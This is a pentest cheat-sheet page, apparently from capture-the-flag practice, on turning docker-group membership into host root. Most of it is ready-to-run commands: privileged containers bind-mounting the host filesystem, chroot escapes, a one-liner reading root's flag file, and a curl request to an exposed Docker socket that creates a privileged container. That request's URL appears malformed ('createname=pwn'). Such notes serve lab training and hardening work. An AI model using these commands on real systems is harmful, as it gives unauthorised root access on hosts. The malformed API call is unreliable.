# Docker Group → Root

Used on: **Kobold, marketplace, ultratech1**

Membership in the `docker` group is equivalent to root on the host, because any user who can talk to the Docker daemon can run a privileged container that bind-mounts `/`.

## Check Membership

<!-- cmd: linux -->
```bash
id
groups
groups <user>          # sometimes you need to check explicitly
```

If the group isn't active in the current shell (typical after `su`/reverse shell):
<!-- cmd: linux -->
```bash
newgrp docker
```

## Exploit — Bind-Mount Host `/`

<!-- cmd: linux -->
```bash
docker run --rm -it --privileged -v /:/hostfs --user root \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
```

- `--privileged` — full capability set + unrestricted cgroups/devices.
- `-v /:/hostfs` — mount the host root filesystem at `/hostfs` inside the container.
- `--entrypoint sh` — skip whatever the image's default entrypoint is.
- `--user root` — run as root inside the container.

Any existing image works — no need to pull a new one if the box has no internet. `docker images` shows what's already there.

## Quick One-Liner (no interactive shell)

<!-- cmd: linux -->
```bash
docker run --rm -i --privileged -v /:/hostfs --user root \
  --entrypoint sh <image> -c "cat /hostfs/root/root.txt"
```

## Chroot Variant

<!-- cmd: linux -->
```bash
docker run -v /:/host -it alpine chroot /host /bin/bash
docker run -v /:/mnt --rm -it 495d6437fc1e chroot /mnt /bin/sh
```

## Docker Socket Exposed but No CLI

If `/var/run/docker.sock` is readable from an unprivileged user but `docker` is not installed:
<!-- cmd: linux -->
```bash
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/createname=pwn \
  -d '{"Image":"alpine","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/:/hostfs"]}}'
```

See also `docker-api-unauthenticated.md` when the daemon is reachable over TCP (`2375`) without TLS.

## Why It Works

- The Docker daemon runs as root.
- There is no privilege boundary between "can talk to the socket" and "full root on host".
- `--privileged` plus host-path bind-mount = container escape is trivial.
